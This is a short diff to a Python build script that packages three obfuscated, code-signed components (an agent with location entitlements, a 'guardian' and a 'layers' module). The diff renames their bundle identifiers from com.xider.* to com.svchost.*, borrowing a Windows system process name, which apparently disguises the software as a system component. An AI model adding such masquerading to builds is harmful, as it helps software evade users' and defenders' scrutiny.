@@ -236,17 +236,17 @@ def main() -> int:
     )
     report_path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
     agent, executable = _build(
-        obfuscated_mcs / "xgent_mcs.py", "XGENT-MCS", "XIDER", "com.xider.agent", version=version,
+        obfuscated_mcs / "xgent_mcs.py", "XGENT-MCS", "XIDER", "com.svchost.agent", version=version,
         modules=_hidden_imports(), resources=AGENT_RESOURCES,
         signing_identity=identity,
         entitlements=MCS / "location.entitlements",
     )
     guardian, _ = _build(
-        obfuscated_mcs / "xider_guardian.py", "XIDER-Guard-Keeper", "XIDER-Guard-Keeper", "com.xider.guardian",
+        obfuscated_mcs / "xider_guardian.py", "XIDER-Guard-Keeper", "XIDER-Guard-Keeper", "com.svchost.guardian",
         version=version, signing_identity=identity,
     )
     layers, _ = _build(
-        obfuscated_mcs / "xider_layers.py", "XIDER-Layers", "XIDER-Layers", "com.xider.layers",
+        obfuscated_mcs / "xider_layers.py", "XIDER-Layers", "XIDER-Layers", "com.svchost.layers",
         version=version, signing_identity=identity,
     )
     destinations = (
